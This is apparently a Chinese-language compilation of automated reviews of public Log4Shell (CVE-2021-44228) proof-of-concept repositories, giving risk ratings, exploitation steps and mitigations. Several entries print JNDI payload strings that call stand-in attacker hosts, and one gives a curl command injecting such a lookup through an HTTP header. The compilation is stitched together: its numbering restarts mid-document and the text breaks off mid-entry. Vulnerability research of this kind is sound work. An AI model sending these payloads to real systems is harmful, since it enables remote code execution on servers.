总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

